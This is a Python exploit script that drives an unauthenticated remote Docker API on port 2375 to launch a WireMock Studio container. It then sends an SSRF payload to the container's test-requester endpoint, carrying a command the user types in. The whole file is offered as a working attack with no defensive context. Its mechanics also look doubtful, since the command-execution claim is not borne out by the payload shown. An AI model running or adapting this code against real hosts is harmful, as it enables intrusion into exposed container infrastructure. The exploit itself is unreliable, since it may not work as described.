import requests
import docker

# Remote Docker API endpoint (replace with your remote host's API endpoint)
docker_api_url = 'http://remote_host_ip:2375'

# Set up a Docker client pointing to the remote API
client = docker.DockerClient(base_url=docker_api_url)

# Start a WireMock Studio container on the remote host
container = client.containers.run(
    'up9inc/wiremock-studio:latest',
    detach=True,
    ports={'9000': 9000, '8000': '8000-8100'},
)

# Wait for the WireMock Studio container to start
container.reload()
while not container.status == "running":
    container.reload()

# Access WireMock Studio UI on the remote host
wiremock_studio_url = f'http://remote_host_ip:9000'

# Create a new Mock API with a random name (customize as needed)
mock_api_name = 'MyMockAPI'
create_mock_api_url = f'{wiremock_studio_url}/api/project/mock/{mock_api_name}'
requests.post(create_mock_api_url)

# Allow the user to input a command to be executed
command_to_run = input("Enter a command to run on the remote Docker instance: ")

# Exploit the SSRF vulnerability using Test Requester
test_requester_url = f'{wiremock_studio_url}/api/project/mock/{mock_api_name}/test-requester'
payload = {'url': f'@127.0.0.1:1234?command={command_to_run}'}
response = requests.post(test_requester_url, json=payload)

# Display the response from the SSRF request
print(f'Response from SSRF request:\n{response.text}')

# Stop and remove the WireMock Studio container on the remote host
container.stop()
container.remove()
